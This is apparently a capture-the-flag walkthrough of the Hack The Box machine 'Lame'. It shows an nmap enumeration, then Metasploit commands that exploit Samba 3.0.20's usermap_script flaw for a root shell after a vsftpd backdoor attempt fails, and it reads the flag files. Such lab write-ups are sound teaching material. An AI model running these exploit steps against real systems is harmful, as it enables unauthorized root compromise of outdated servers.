Target: 10.10.10.3

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.3

Nmap scan report for 10.10.10.3
Host is up (0.058s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m46s, deviation: 2h49m44s, median: 44s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-05-15T02:31:12-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Findings:Looking for attack vectors

The victim machine runs outdated versions of ftp, ssh, and smbd. 
Look for possible exploits for these three services.


## Foothold:

exploit links:

[vsftpd 2.3.4](https://www.exploit-db.com/exploits/17491)

[samba 3.0.2](https://www.exploit-db.com/exploits/16320)


Metasploit
```
$ msfconsole
```

searching for vsftpd 2.3.4 exploits
```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created
```

searching for samba 3.0.2 exploits
```
search samba 3.0.2

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
   1  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   2  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow


use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
```

```
id

uid=0(root) gid=0(root)
```

```
cat /home/makis/user.txt

<redacted>
```

```
cat /root/root.txt

<redacted>
```
